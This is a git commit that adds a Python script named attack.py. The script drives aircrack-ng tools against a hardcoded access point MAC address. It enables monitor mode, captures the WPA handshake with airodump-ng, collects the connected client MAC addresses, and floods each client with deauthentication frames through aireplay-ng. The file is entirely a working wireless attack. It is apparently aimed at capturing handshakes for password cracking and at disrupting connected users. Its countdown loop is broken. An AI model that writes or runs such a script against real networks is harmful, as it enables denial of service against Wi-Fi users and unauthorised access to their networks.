9d799374d60c87787ec859ac05347f9160524d1b
_Dark_Moon <36711164+bgnacinski@users.noreply.github.com>
2020-04-03 19:41:00 +0200

    Add files via upload

---
+++ attack.py
@@ -0,0 +1,49 @@
+#!/usr/bin/python3
+import threading
+import time
+import csv
+import os
+
+def deauth(client):
+    command = "sudo aireplay-ng -0 1 -a 20:A9:0E:40:B3:71 -c {} wlan0mon".format(client)
+
+    os.system(command)
+
+print("[!] Run this script as root")
+
+print("Attack will start in 5 seconds.")
+
+for i in range(5, 0):
+    print(i)
+    time.sleep(1)
+
+os.system("sudo airmon-ng check kill")
+os.system("sudo airmon-ng start wlan0")
+
+wpa_handshake_thread = threading.Thread(target=os.system, args=("sudo airodump-ng -c 1 --bssid 20:A9:0E:40:B3:71 -w sp91 wlan0mon",))
+wpa_handshake_thread.start()
+
+clients = []
+
+with open("sp91-01.csv") as file:
+    csv_reader = csv.reader(file)
+
+    for i in csv_reader:
+        try:
+            if ":" in i[0]:
+                print(i[0])
+                clients.append(i[0])
+
+        except:
+            pass
+
+for i in clients:
+    if i != "20:A9:0E:40:B3:71":
+        deauth_thread = threading.Thread(target=deauth, args=(i,))
+        deauth_thread.start()
+
+print("Deauthorizing clients...")
+
+time.sleep(10)
+exit("Attack finished")
+os.system("reboot")
